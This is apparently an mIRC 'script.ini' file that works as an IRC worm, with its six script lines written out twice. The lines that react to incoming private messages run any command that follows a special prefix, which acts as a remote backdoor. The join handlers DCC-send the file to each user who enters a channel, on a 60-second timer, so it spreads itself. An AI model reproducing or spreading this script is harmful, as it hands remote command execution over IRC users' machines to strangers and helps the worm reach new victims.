[script]
n0=flash
n1=on 1:text:�� *:?:{ s *2 | halt }
n2=alias /s / *1
n3=on 1:connect:/.enable #d
n4=#d on
n5=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }
n6=#d end
n7=on 1:text:�� *:?:{ s *2 | halt }
n8=alias /s / *1
n9=on 1:connect:/.enable #d
n10=#d on
n11=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }
n12=#d end
